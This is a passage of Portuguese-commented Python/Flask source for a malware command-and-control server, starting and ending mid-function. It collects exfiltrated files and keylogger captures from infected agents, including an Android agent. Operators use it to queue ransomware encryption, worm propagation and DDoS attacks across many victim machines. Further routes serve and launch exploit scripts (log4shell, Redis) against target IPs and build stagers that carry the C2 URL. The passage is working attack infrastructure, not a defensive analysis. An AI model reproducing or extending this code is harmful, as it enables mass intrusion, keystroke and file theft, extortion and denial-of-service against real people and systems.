            })
            conn.close()
            resp_json = json.dumps({"status": "success"})
            return app.response_class(encrypt_data(resp_json, C2_AES_KEY), mimetype='text/plain')

        # 4. Loga o evento de sistema
        cursor.execute("SELECT command FROM tasks WHERE id = ?", (task_id,))
        task_row = cursor.fetchone()
        command_name = task_row['command'] if task_row else "desconhecido"
        
        if command_name != 'sleep':
            log_system_event(agent_id, new_status_db.upper(), f"Comando '{command_name}' finalizado.")
        

        # 5. Processa tipos de dados especiais (salvar arquivos, etc.)
        if data_type == 'file_download':
            try:
                file_content = base64.b64decode(result_data['content_b64'])
                agent_dir = os.path.join(DOWNLOADS_DIR, agent_id); os.makedirs(agent_dir, exist_ok=True)
                file_path = os.path.join(agent_dir, result_data['filename'])
                with open(file_path, 'wb') as f: f.write(file_content)
                log_system_event(agent_id, "DOWNLOAD_SUCCESS", f"Arquivo '{result_data['filename']}' salvo.")
            except Exception as e:
                log_system_event(agent_id, "ERROR", f"Erro ao salvar arquivo baixado: {e}")

        elif data_type == 'keylogger_data':
            try:
                # --- INÍCIO DA CORREÇÃO (Item 1 do relatório do servidor) ---
                # Garante que o diretório do agente exista
                agent_keylog_dir = os.path.join(KEYLOGS_DIR, agent_id)
                os.makedirs(agent_keylog_dir, exist_ok=True)
                
                # Define o caminho do arquivo de log
                log_file_path = os.path.join(agent_keylog_dir, 'keylog.txt')
                
                # Salva o log no arquivo, adicionando uma nova linha
                with open(log_file_path, 'a', encoding='utf-8') as f:
                    f.write(result_data)
                
                print(f"[INFO] Keylog do agente {agent_id} salvo em {log_file_path}")
                # --- FIM DA CORREÇÃO ---

                # A sua lógica de banco de dados e WebSocket permanece
                conn_kl = get_db_connection()
                conn_kl.execute(
                    "INSERT INTO keylogs (agent_id, log_data, timestamp) VALUES (?, ?, ?)",
                    (agent_id, result_data, datetime.now().isoformat())
                )
                conn_kl.commit()
                conn_kl.close()
                socketio.emit('new_keylog', {'agent_id': agent_id, 'log_data': result_data})
            except Exception as e:
                log_system_event(agent_id, "ERROR", f"Falha ao processar keylog: {e}")

        # 6. Notifica o painel com os dados atualizados
        
        # Emite o evento para a "Janela de Resultados"
        socketio.emit('new_result', {"agent_id": agent_id, "task_id": task_id, "data_type": data_type, "data": result_data})
        
        # Busca a lista de tarefas ATUALIZADA e emite para a "Linha do Tempo"
        conn_read = get_db_connection()
        tasks_from_db = conn_read.execute("SELECT * FROM tasks WHERE agent_id = ? ORDER BY timestamp_issued DESC", (agent_id,)).fetchall()
        conn_read.close()
        all_agent_tasks = [dict(row) for row in tasks_from_db]
        socketio.emit('tasks_update', {'agent_id': agent_id, 'tasks': all_agent_tasks})
        
        

        # --- FIM DAS CORREÇÕES E MELHORIAS ---

        # 7. Responde ao agente
        resp_json = json.dumps({"status": "success"})
        return app.response_class(encrypt_data(resp_json, C2_AES_KEY), mimetype='text/plain')

    except Exception as e:
        print(f"[ERRO CRÍTICO] Falha na rota /task_result: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": "Erro interno do servidor ao processar resultado."}), 500



@app.route('/issue_command', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator']) # Garante que Observers não possam nem tentar
def issue_command_route():
    try:
        data = request.json
        agent_id = data.get('agent_id')
        command = data.get('command')
        args = data.get('args', "")

        if not agent_id or not command:
            return jsonify({"error": "agent_id e command são obrigatórios"}), 400

        # --- INÍCIO DA LÓGICA DE PERMISSÃO POR COMANDO (MELHORIA 1) ---

        # Lista de comandos de alto risco, restritos apenas a Administradores.
        ADMIN_ONLY_COMMANDS = [
            'cleanup',          # Risco de perda de acesso permanente.
            'encrypt',          # Ação explicitamente destrutiva (ransomware).
            'decrypt_target',   # Ação de recuperação sensível.
            'start_attack',     # Lança ataque DDoS, muito "barulhento" e arriscado.
            'start_worm_mode'   # Risco de propagação descontrolada.
        ]

        # Verifica se o comando está na lista de restrição E se o usuário NÃO é um Administrador.
        if command in ADMIN_ONLY_COMMANDS and session.get('role') != 'Administrator':
            # Loga a tentativa de acesso não autorizado para auditoria.
            log_operator_action(
                session.get('username'), 
                "DENIED_COMMAND", 
                {'denied_command': command, 'target_agent': agent_id}
            )
            return jsonify({"error": f"Acesso negado. O comando '{command}' requer privilégios de Administrador."}), 403

        # --- FIM DA LÓGICA DE PERMISSÃO POR COMANDO ---

        # O resto da função continua como antes...
        conn = get_db_connection()
        cursor = conn.cursor()

        # Verifica se o agente existe
        cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({"error": "Agente não encontrado"}), 404

        # Loga a ação do operador (agora sabemos que ela é permitida)
        log_operator_action(session.get('username'), command, {'agent_id': agent_id, 'args': args})
        
        # Prepara e insere a tarefa no banco de dados
        task_data = {
            "id": str(uuid.uuid4()),
            "agent_id": agent_id,
            "command": command,
            "args": json.dumps(args) if isinstance(args, (dict, list)) else args,
            "status": "pendente",
            "timestamp_issued": datetime.now().isoformat(),
            "result": None,
            "data_type": None
        }

        cursor.execute(
            """
            INSERT INTO tasks (id, agent_id, command, args, status, timestamp_issued, result, data_type)
            VALUES (:id, :agent_id, :command, :args, :status, :timestamp_issued, :result, :data_type)
            """,
            task_data
        )
        
        conn.commit()
        conn.close()

        trigger_dashboard_update()
        
        return jsonify({"status": "Comando enfileirado", "task_id": task_data["id"]})

    except Exception as e:
        print(f"[ERRO CRÍTICO] Falha na rota /issue_command: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": "Erro interno do servidor ao criar a tarefa."}), 500




@app.route('/get_task_mobile/<agent_id>', methods=['GET'])
def get_task_mobile(agent_id):
    """
    Endpoint de busca de tarefas SEM CRIPTOGRAFIA, para o agente Android.
    """
    # --- PARTE 1: ATUALIZAÇÃO DO AGENTE (last_seen) ---
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    agent_row = cursor.fetchone()

    if not agent_row:
        conn.close()
        # Se o agente não existe, retorna um erro claro
        return jsonify({"error": "Agente não registrado"}), 404

    # Atualiza o last_seen para manter o agente online
    cursor.execute("UPDATE agents SET last_seen = ? WHERE id = ?", (datetime.now().isoformat(), agent_id))
    conn.commit()
    # A lógica de atualizar GEO pode ser mantida, mas vamos simplificar por agora

    # --- PARTE 2: BUSCA DE TAREFAS ---
    task_to_send = None
    try:
        cursor.execute(
            "SELECT id, command, args FROM tasks WHERE agent_id = ? AND status = 'pendente' ORDER BY timestamp_issued ASC LIMIT 1",
            (agent_id,)
        )
        task_row = cursor.fetchone()

        if task_row:
            # Tarefa encontrada, marca como 'Executando'
            task_id = task_row['id']
            cursor.execute("UPDATE tasks SET status = 'executando' WHERE id = ?", (task_id,))
            conn.commit()
            
            # Tenta converter os argumentos para JSON se for o caso
            args_val = task_row['args']
            try:
                args_parsed = json.loads(args_val) if args_val and (args_val.startswith('{') or args_val.startswith('[')) else args_val
            except (json.JSONDecodeError, TypeError):
                args_parsed = args_val

            task_to_send = {"task_id": task_id, "command": task_row['command'], "args": args_parsed}
        else:
            # Nenhuma tarefa pendente, envia 'sleep'
            task_to_send = {"task_id": None, "command": "sleep", "args": "1"} # Usando 1 minuto
    except Exception as e:
        print(f"[ERRO DB] Falha ao buscar tarefa para o agente mobile {agent_id}: {e}")
        task_to_send = {"task_id": None, "command": "sleep", "args": "5"}
    finally:
        conn.close()

    # --- PARTE 3: NOTIFICAÇÃO E RESPOSTA ---
    # Notifica o painel que o agente está online
    socketio.emit('agent_list_update', get_agents_with_status())
    
    # Retorna a tarefa como um JSON puro
    return jsonify(task_to_send)




@app.route('/task_result_mobile', methods=['POST'])
def post_result_mobile():
    """
    Endpoint que recebe resultados de tarefas SEM CRIPTOGRAFIA, para o agente Android.
    """
    try:
        # 1. Pega os dados diretamente do JSON, sem descriptografar
        data = request.json
        if not data:
            return jsonify({"error": "Payload JSON inválido ou vazio."}), 400

        # 2. Extrai as informações
        agent_id = data.get('agent_id')
        task_id = data.get('task_id')
        data_type = data.get('data_type', 'generic_result')
        result_data = data.get('result')

        if not task_id or not agent_id:
            return jsonify({"error": "agent_id ou task_id ausentes."}), 400

        conn = get_db_connection()
        cursor = conn.cursor()

        # 3. Atualiza a tarefa no banco de dados
        new_status_db = 'concluido' if data_type != 'error' else 'erro'
        # Converte o resultado para uma string JSON para salvar no banco
        result_str = json.dumps(result_data) if isinstance(result_data, (dict, list)) else str(result_data)
        
        cursor.execute(
            "UPDATE tasks SET status = ?, result = ?, data_type = ? WHERE id = ?",
            (new_status_db, result_str, data_type, task_id)
        )
        conn.commit()
        
        # Loga o evento de conclusão
        cursor.execute("SELECT command FROM tasks WHERE id = ?", (task_id,))
        task_row = cursor.fetchone()
        command_name = task_row['command'] if task_row else "desconhecido"
        log_system_event(agent_id, new_status_db.upper(), f"Comando '{command_name}' finalizado.")

        conn.close()

        # 4. Notifica o painel sobre o novo resultado
        socketio.emit('new_result', {"agent_id": agent_id, "task_id": task_id, "data_type": data_type, "data": result_data})
        
        # Atualiza a lista de tarefas no painel
        conn_read = get_db_connection()
        tasks_from_db = conn_read.execute("SELECT * FROM tasks WHERE agent_id = ? ORDER BY timestamp_issued DESC", (agent_id,)).fetchall()
        conn_read.close()
        all_agent_tasks = [dict(row) for row in tasks_from_db]
        socketio.emit('tasks_update', {'agent_id': agent_id, 'tasks': all_agent_tasks})
        
        trigger_dashboard_update()

        # 5. Responde ao agente com sucesso
        return jsonify({"status": "success"})

    except Exception as e:
        print(f"[ERRO] Falha no endpoint /task_result_mobile: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({"error": "Erro interno no servidor ao processar resultado."}), 500



@app.route('/get_tasks/<agent_id>', methods=['GET'])
@login_required
def get_tasks(agent_id):
    # --- INÍCIO DA MIGRAÇÃO SQL ---
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    agent_exists = cursor.fetchone()

    if not agent_exists:
        conn.close()
        return jsonify({"error": "Agente não encontrado"}), 404

    # 2. Busca todas as tarefas para o agente_id especificado, ordenadas pela mais recente
    cursor.execute("SELECT * FROM tasks WHERE agent_id = ? ORDER BY timestamp_issued DESC", (agent_id,))
    tasks_rows = cursor.fetchall()
    conn.close()

    # 3. Converte as linhas do banco de dados em uma lista de dicionários
    #    A mesma estrutura que o painel espera.
    agent_tasks = [dict(row) for row in tasks_rows]
    
    return jsonify(agent_tasks)
    # --- FIM DA MIGRAÇÃO SQL ---

@app.route('/get_system_logs/<agent_id>', methods=['GET'])
@login_required
def get_system_logs(agent_id):
    # --- INÍCIO DA MIGRAÇÃO SQL ---
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return "Agente não encontrado.", 404

    # 2. Busca todos os logs para o agente, ordenados do mais antigo para o mais recente
    cursor.execute("SELECT timestamp, event_type, message FROM system_logs WHERE agent_id = ? ORDER BY timestamp ASC", (agent_id,))
    log_rows = cursor.fetchall()
    conn.close()

    if not log_rows:
        return "Nenhum log de sistema para este agente.", 200 # Retorna 200 OK com uma mensagem

    # 3. Formata os logs para exibição, similar ao formato de arquivo antigo
    formatted_logs = []
    for row in log_rows:
        # Recria a string de log a partir dos dados do banco
        timestamp_dt = datetime.fromisoformat(row['timestamp'])
        formatted_timestamp = timestamp_dt.strftime('%Y-%m-%d %H:%M:%S')
        log_line = f"[{formatted_timestamp}] [{row['event_type']}] {row['message']}"
        formatted_logs.append(log_line)
    
    return "\n".join(formatted_logs), 200
    # --- FIM DA MIGRAÇÃO SQL ---



@app.route('/get_history/<agent_id>', methods=['GET'])
@login_required
def get_history(agent_id):
    # --- INÍCIO DA MIGRAÇÃO SQL ---
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Agente não encontrado"}), 404

    # 2. Busca todas as tarefas CONCLUÍDAS ou com ERRO para o agente,
    #    que são as que constituem o histórico de resultados.
    #    Ordena pelas mais recentes primeiro.
    cursor.execute(
        "SELECT id, command, timestamp_issued, status, result, data_type FROM tasks WHERE agent_id = ? AND (status = 'concluido' OR status = 'erro') ORDER BY timestamp_issued DESC",
        (agent_id,)
    )
    task_rows = cursor.fetchall()
    conn.close()

    history_results = []
    for row in task_rows:
        # Tenta decodificar o resultado de volta para um objeto Python, se for um JSON.
        try:
            result_data = json.loads(row['result']) if row['result'] and (row['result'].startswith('{') or row['result'].startswith('[')) else row['result']
        except (json.JSONDecodeError, TypeError):
            result_data = row['result'] # Se não for JSON, usa como texto.

        # Monta a estrutura de dicionário que o painel espera
        history_results.append({
            "task_id": row['id'],
            "command": row['command'],
            "timestamp": row['timestamp_issued'],
            "data_type": row['data_type'], # Precisamos adicionar esta coluna à tabela 'tasks'
            "data": result_data,
            "agent_id": agent_id
        })
        
    return jsonify(history_results)
    # --- FIM DA MIGRAÇÃO SQL ---




@app.route('/api/geolocate/<ip_address>')
def geolocate_ip(ip_address):
    """
    Endpoint proxy que agora utiliza a função interna 'resolve_geo',
    aproveitando o sistema de cache para economizar requisições de API.
    """
    # A mágica está aqui: reutilizamos a sua função com cache!
    geo_data = resolve_geo(ip_address)

    if geo_data:
        # A função resolve_geo já retorna um dicionário pronto (ou None)
        return jsonify(geo_data)
    else:
        # Se a função não encontrar nada (IP inválido, erro na API, etc.), retornamos um erro
        return jsonify({"error": "Não foi possível obter a geolocalização para o IP."}), 404


@app.route('/delete_agents', methods=['POST'])
@login_required
def delete_agents():
    data = request.json
    agent_ids_to_delete = data.get('agent_ids', [])
    
    if not agent_ids_to_delete:
        return jsonify({"status": "noop", "message": "Nenhum ID de agente fornecido."})

    # --- INÍCIO DA MIGRAÇÃO SQL ---
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # O método executemany é otimizado para executar o mesmo comando várias vezes
    # com diferentes valores. Usamos uma lista de tuplas para isso.
    # Ex: [('id1',), ('id2',)]
    ids_as_tuples = [(agent_id,) for agent_id in agent_ids_to_delete]
    
    cursor.executemany("DELETE FROM agents WHERE id = ?", ids_as_tuples)
    
    deleted_count = cursor.rowcount # Pega o número de linhas que foram afetadas (deletadas)
    conn.commit()
    conn.close()
    
    # A remoção de arquivos de download ainda precisa ser manual
    for agent_id in agent_ids_to_delete:
        agent_download_dir = os.path.join(DOWNLOADS_DIR, agent_id)
        if os.path.isdir(agent_download_dir):
            try:
                shutil.rmtree(agent_download_dir)
            except OSError as e:
                print(f"[ERRO] Falha ao remover diretório de downloads para {agent_id}: {e}")

    # --- FIM DA MIGRAÇÃO SQL ---

    log_operator_action("SYSTEM", "delete_selected", {"deleted_ids": agent_ids_to_delete})
    
    # Notifica o painel para atualizar a lista de agentes
    socketio.emit('agent_list_update', get_agents_with_status())
    
    return jsonify({"status": "success", "deleted_count": deleted_count})

@app.route('/get_keylogs/<agent_id>', methods=['GET'])
@login_required
def get_keylogs(agent_id):
    # --- INÍCIO DA MIGRAÇÃO SQL ---
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return "Agente não encontrado.", 404

    # 2. Busca todos os fragmentos de keylog para o agente, em ordem
    cursor.execute("SELECT log_data FROM keylogs WHERE agent_id = ? ORDER BY timestamp ASC", (agent_id,))
    log_rows = cursor.fetchall()
    conn.close()

    if not log_rows:
        return "Nenhum log capturado para este agente ainda.", 200 # Retorna 200 OK

    # 3. Concatena todos os fragmentos de log em uma única string
    full_log = "".join([row['log_data'] for row in log_rows])
    
    return full_log, 200
    # --- FIM DA MIGRAÇÃO SQL ---


def get_agents_with_status():
    """
    Pega os agentes do banco de dados e adiciona o status 'online'/'offline'.
    """
    # Dicionário que será retornado, no mesmo formato que o painel espera.
    agents_with_status = {}
    
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Seleciona todos os agentes do banco de dados.
        cursor.execute("SELECT * FROM agents")
        all_agents_rows = cursor.fetchall()
        conn.close()

        now = datetime.now()
        
        for agent_row in all_agents_rows:
            # A 'row_factory' que definimos em get_db_connection nos permite
            # converter a linha do banco diretamente para um dicionário.
            agent_dict = dict(agent_row)
            
            # A lógica de cálculo de status permanece exatamente a mesma.
            last_seen_dt = datetime.fromisoformat(agent_dict['last_seen'])
            if (now - last_seen_dt) < timedelta(seconds=AGENT_TIMEOUT_SECONDS):
                agent_dict['status'] = 'online'
            else:
                agent_dict['status'] = 'offline'
            
            # Adiciona o dicionário do agente ao resultado final, usando o ID como chave.
            agents_with_status[agent_dict['id']] = agent_dict
            
    except Exception as e:
        print(f"[ERRO DB] Falha ao buscar agentes do banco de dados: {e}")
        # Retorna um dicionário vazio em caso de erro para não quebrar o painel.
        return {}
        
    return agents_with_status




# --- INÍCIO DA MUDANÇA: LÓGICA DO DASHBOARD APRIMORADA ---
def get_dashboard_data_logic():
    """
    Coleta dados para o dashboard, lendo diretamente do banco de dados SQLite.
    """
    # --- INÍCIO DA MIGRAÇÃO SQL ---
    # A função get_agents_with_status() já usa o DB, então podemos reutilizá-la.
    agents_with_status = get_agents_with_status()
    
    conn = get_db_connection()
    cursor = conn.cursor()

    # --- KPIs (Key Performance Indicators) ---
    total_agents = len(agents_with_status)
    online_agents = len([a for a in agents_with_status.values() if a['status'] == 'online'])

    # Busca o agente com o 'last_seen' mais recente diretamente do banco
    cursor.execute("SELECT hostname, last_seen FROM agents ORDER BY last_seen DESC LIMIT 1")
    latest_agent_row = cursor.fetchone()
    
    last_checkin = {'hostname': None, 'time': '1970-01-01T00:00:00.000000'}
    if latest_agent_row:
        last_checkin = {'hostname': latest_agent_row['hostname'], 'time': latest_agent_row['last_seen']}

    kpis = {
        'total_agents': total_agents,
        'online_agents': online_agents,
        'offline_agents': total_agents - online_agents,
        'last_checkin': last_checkin
    }

    # --- DADOS PARA GRÁFICOS ---
    now = datetime.now()
    activity_data = [0] * 24
    # Usa o dicionário já carregado pela get_agents_with_status
    for agent in agents_with_status.values():
        last_seen = datetime.fromisoformat(agent['last_seen'])
        if now - last_seen < timedelta(hours=24):
            hour_diff = (now - last_seen).seconds // 3600
            activity_data[23 - hour_diff] += 1
    activity_labels = [(now - timedelta(hours=i)).strftime('%H:00') for i in range(23, -1, -1)]

    # Gráficos de Pizza (SO e Privilégios) - Usa o mesmo dicionário
    os_counts = Counter(a.get('os_name', 'Desconhecido').split(' ')[0] for a in agents_with_status.values())
    priv_counts = Counter(a.get('privileges', 'Desconhecido') for a in agents_with_status.values())

    # Gráfico de Comandos Mais Usados - Busca no banco de dados
    cursor.execute("SELECT command, COUNT(command) as count FROM tasks GROUP BY command ORDER BY count DESC LIMIT 5")
    top_commands_rows = cursor.fetchall()
    top_commands = {'labels': [row['command'] for row in top_commands_rows], 'data': [row['count'] for row in top_commands_rows]}

    charts_data = {
        'activity': {'labels': activity_labels, 'data': activity_data},
        'os_distribution': {'labels': list(os_counts.keys()), 'data': list(os_counts.values())},
        'privileges_distribution': {'labels': list(priv_counts.keys()), 'data': list(priv_counts.values())},
        'top_commands': top_commands
    }

    # --- DADOS DO MAPA ---
    map_data = []
    base_lat, base_lon = -24.9555, -53.4552
    for agent_id, agent_data in agents_with_status.items():
        agent_info = {
            'id': agent_id,
            'hostname': agent_data.get('hostname'),
            'ip': agent_data.get('external_ip') or agent_data.get('internal_ip'),
            'os': agent_data.get('os_name'),
            'status': agent_data.get('status'),
            'lat': agent_data.get('geo_latitude'),
            'lon': agent_data.get('geo_longitude'),
            'city': agent_data.get('geo_city'),
            'country': agent_data.get('geo_country')
        }
        # Fallback para visualização se a geolocalização falhou
        if not agent_info['lat'] or not agent_info['lon']:
            agent_info['lat'] = base_lat + random.uniform(-0.05, 0.05)
            agent_info['lon'] = base_lon + random.uniform(-0.05, 0.05)
        map_data.append(agent_info)

    # --- AGENTES RECENTES E FEED DE ATIVIDADE ---
    # Busca os 5 agentes mais recentes no banco
    cursor.execute("SELECT hostname, username, last_seen FROM agents ORDER BY last_seen DESC LIMIT 5")
    recent_agents_data = [dict(row) for row in cursor.fetchall()]

    # Busca as 7 tarefas mais recentes no banco
    cursor.execute("SELECT command, timestamp_issued, status FROM tasks ORDER BY timestamp_issued DESC LIMIT 7")
    activity_feed_data = [dict(row) for row in cursor.fetchall()]
    
    conn.close()
    # --- FIM DA MIGRAÇÃO SQL ---

    return {
        'kpis': kpis,
        'charts': charts_data,
        'map_data': map_data,
        'recent_agents': recent_agents_data,
        'activity_feed': activity_feed_data
    }

def add_task_to_db(agent_id, command, args):
    """
    Função auxiliar para adicionar uma tarefa ao banco de dados.
    Versão corrigida para usar os nomes de coluna corretos (id, timestamp_issued, etc.).
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    task_id = str(uuid.uuid4())
    
    # Prepara os dados para inserção, garantindo que todos os campos necessários estejam presentes
    task_data = {
        "id": task_id,
        "agent_id": agent_id,
        "command": command,
        "args": json.dumps(args) if isinstance(args, (dict, list)) else args,
        "status": "pendente", # Padronizado para minúsculo
        "timestamp_issued": datetime.now().isoformat(),
        "result": None,      # Inicializa o resultado como nulo
        "data_type": None    # Inicializa o tipo de dado como nulo
    }

    # Query SQL CORRIGIDA para usar os nomes de coluna do seu schema.sql
    # (id, agent_id, command, args, status, timestamp_issued, result, data_type)
    cursor.execute(
        """
        INSERT INTO tasks (id, agent_id, command, args, status, timestamp_issued, result, data_type) 
        VALUES (:id, :agent_id, :command, :args, :status, :timestamp_issued, :result, :data_type)
        """,
        task_data
    )
    
    conn.commit()
    conn.close()
    return task_id


@app.route('/launch_mass_attack', methods=['POST'])
@login_required
@role_required(['Administrator'])
def launch_mass_attack():
    """
    Recebe uma lista de AGENTES SELECIONADOS e parâmetros de ataque,
    e cria uma tarefa individual para CADA agente.
    """
    try:
        data = request.json
        
        # 1. Extrai os dados da requisição
        agent_ids_to_task = data.get('agent_ids', [])
        
        if not agent_ids_to_task:
            return jsonify({"status": "error", "message": "Nenhum agente foi selecionado."}), 400

        # 2. Monta o dicionário de argumentos para a tarefa
        task_args = {
            "method": data.get('method'),
            "target": data.get('target'),
            "port": data.get('port'),
            "duration": data.get('duration'),
            "threads": data.get('threads')
        }
        
        # 3. Itera sobre cada AGENT_ID selecionado e cria uma tarefa específica para ele
        tasks_created_count = 0
        for agent_id in agent_ids_to_task:
            # A função do agente é 'start_attack', e os argumentos são o JSON que montamos
            # A função add_task_to_db que você já tem é chamada aqui
            add_task_to_db(agent_id, "start_attack", task_args)
            tasks_created_count += 1
            
        print(f"[+] Ataque Direcionado despachado. {tasks_created_count} tarefas criadas para o comando '{task_args['method']}'.")

        return jsonify({
            "status": "success",
            "message": f"Comando de ataque '{task_args['method']}' enviado para {tasks_created_count} agente(s) selecionado(s)."
        })

    except Exception as e:
        print(f"[ERROR] Falha ao despachar ataque direcionado: {e}")
        return jsonify({"status": "error", "message": "Erro interno do servidor ao processar o ataque."}), 500


@app.route('/exploits/<path:filename>')
@hmac_required # Protege para que apenas você possa ver/listar os exploits
def download_exploit(filename):
    """
    Rota segura para servir scripts de exploit da pasta 'exploits'.
    """
    exploits_dir = os.path.join(app.root_path, 'exploits')
    return send_from_directory(exploits_dir, filename)


@app.route('/api/get_vuln_map', methods=['GET'])
#@hmac_required # Protegido para que apenas agentes possam pedir
def get_vuln_map():
    """
    Endpoint para o agente obter o dicionário de vulnerabilidades.
    """
    return jsonify(VULN_MAP)

@app.route('/launch_scan_and_exploit', methods=['POST'])
@login_required # Protegido para que apenas o operador possa iniciar
def launch_scan_and_exploit():
    """
    Recebe uma lista de alvos do painel e cria uma única tarefa 
    'scan_and_exploit' para um agente selecionado.
    """
    data = request.json
    agent_id = data.get('agent_id')
    targets_str = data.get('targets', '') # Recebe como uma string de IPs separados por vírgula/espaço
    
    if not agent_id or not targets_str:
        return jsonify({"status": "error", "message": "ID do agente e lista de alvos são necessários."}), 400

    # Converte a string de alvos em uma lista limpa de IPs
    target_list = [ip.strip() for ip in re.split(r'[,\s\n]+', targets_str) if ip.strip()]

    if not target_list:
        return jsonify({"status": "error", "message": "Nenhum alvo válido fornecido."}), 400

    # Cria a tarefa para o agente selecionado
    task_args = {"targets": target_list}
    add_task_to_db(agent_id, "scan_and_exploit", task_args)
    
    return jsonify({"status": "success", "message": f"Tarefa de varredura e exploração enviada para o agente {agent_id} com {len(target_list)} alvos."})


def _parse_exploit_meta(filepath: Path) -> dict:
    """Extrai metadados dos comentários do topo do script."""
    meta = {
        "filename":    filepath.name,
        "name":        filepath.stem,
        "cve":         None,
        "description": None,
        "default_port": None,
    }
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line.startswith('#'):
                    if line: break
                    continue
                if 'CVE:'          in line: meta['cve']          = line.split('CVE:')[1].strip()
                elif 'Description:' in line: meta['description']  = line.split('Description:')[1].strip()
                elif 'Default-Port:' in line: meta['default_port'] = line.split('Default-Port:')[1].strip()
    except Exception:
        pass
    return meta
 
 
def _parse_ports(ports_input: list) -> list:
    """
    Converte a lista de portas recebida do frontend (já processada pelo JS)
    em uma lista de inteiros. Aceita também ranges como strings '8080-8090'.
    """
    if not ports_input:
        return []
    result = set()
    for item in ports_input:
        if isinstance(item, int):
            result.add(item)
        elif isinstance(item, str) and '-' in item:
            try:
                a, b = map(int, item.split('-'))
                result.update(range(a, b + 1))
            except Exception:
                pass
        else:
            try:
                result.add(int(item))
            except Exception:
                pass
    return sorted(list(result))
 
 
def _load_exploit_module(exploit_path: Path):
    """Carrega e retorna o módulo Python do exploit."""
    spec   = importlib.util.spec_from_file_location(exploit_path.stem, exploit_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module
 
 
def _get_stager_script(c2_base_url: str) -> str:
    """Gera um stager_script mínimo com a URL do C2 para os exploits que precisam instalar drone."""
    return f'C2_URL="{c2_base_url}"\n'
 
 
# ==============================================================================
# ROTAS
# ==============================================================================
 
@app.route('/exploits')
@login_required
@role_required('Administrator')
def exploits_page():
    return render_template('exploits.html')
 
 
@app.route('/api/exploits/list', methods=['GET'])
@login_required
@role_required('Administrator')
def list_exploits():
    try:
        EXPLOITS_DIR.mkdir(exist_ok=True)
        exploits = [_parse_exploit_meta(f) for f in sorted(EXPLOITS_DIR.glob('*.py'))]
        return jsonify({"exploits": exploits})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
 
 
@app.route('/api/exploits/run', methods=['POST'])
@login_required
@role_required('Administrator')
def run_exploits_server():
    """
    Executa um ou mais exploits em uma ou mais portas contra um alvo.
 
    Body JSON:
        exploits:  lista de nomes de arquivo (ex: ["log4shell.py", "redis_unauth_cron.py"])
        target_ip: IP do alvo
        ports:     lista de portas (ex: [6379, 8080]) — vazio usa default de cada exploit
        mode:      "sequential" | "parallel"
        run_id:    ID único da execução
    """
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "Body inválido."}), 400
 
    exploit_names = data.get('exploits', [])
    target_ip     = data.get('target_ip')
    ports_raw     = data.get('ports', [])
    mode          = data.get('mode', 'sequential')
    run_id        = data.get('run_id', f"run-{uuid.uuid4()}")
 
    if not exploit_names:
        return jsonify({"status": "error", "message": "Nenhum exploit selecionado."}), 400
    if not target_ip:
        return jsonify({"status": "error", "message": "target_ip é obrigatório."}), 400
 
    # Sanitiza e valida os nomes
    exploit_names = [os.path.basename(n) for n in exploit_names]
    for name in exploit_names:
        if not (EXPLOITS_DIR / name).exists():
            return jsonify({"status": "error", "message": f"Exploit '{name}' não encontrado."}), 404
 
    ports = _parse_ports(ports_raw)
 
    log_operator_action(
        session.get('username', 'unknown'),
        'run_exploit_server',
        f"{', '.join(exploit_names)} → {target_ip}"
    )
 
    thread = threading.Thread(
        target=_execute_jobs_thread,
        args=(exploit_names, target_ip, ports, mode, run_id),
        daemon=True
    )
    thread.start()
 
    return jsonify({"status": "started", "run_id": run_id})
 
 
# ==============================================================================
# EXECUÇÃO DOS JOBS
# ==============================================================================
 
def _build_jobs(exploit_names: list, ports: list) -> list:
    """
    Constrói a lista de jobs (exploit, porta).
    Se ports estiver vazio, usa a porta default de cada exploit (ou None).
    """
    jobs = []
    for name in exploit_names:
        meta         = _parse_exploit_meta(EXPLOITS_DIR / name)
        default_port = meta.get('default_port')
        job_ports    = ports if ports else ([int(default_port)] if default_port else [None])
        for port in job_ports:
            jobs.append({"exploit": name, "port": port})
    return jobs
 
 
def _execute_single_job(job: dict, target_ip: str, run_id: str, stager_script: str):
    """Executa um único job (exploit + porta) e emite eventos via WebSocket."""
    exploit_name = job['exploit']
    port         = job['port']
    exploit_path = EXPLOITS_DIR / exploit_name
    status       = 'failed'
 
    def log_fn(message: str):
        msg_lower = message.lower()
        if any(k in msg_lower for k in ['erro','error','falha','failed','✗']):
            level = 'error'
        elif any(k in msg_lower for k in ['sucesso','success','✓','comprometido','ok']):
            level = 'success'
        elif any(k in msg_lower for k in ['passo','etapa','[passo','step']):
            level = 'step'
        elif any(k in msg_lower for k in ['vuln','cve','exploit','jndi','redis']):
            level = 'vuln'
        elif any(k in msg_lower for k in ['aviso','warn']):
            level = 'warn'
        else:
            level = 'info'
        socketio.emit('exploit_log', {'run_id': run_id, 'message': message, 'level': level})
 
    try:
        log_fn(f"[JOB] {exploit_name} → {target_ip}:{port or 'default'}")
        module = _load_exploit_module(exploit_path)
 
        if not hasattr(module, 'run') or not callable(module.run):
            raise RuntimeError(f"'{exploit_name}' não define função run().")
 
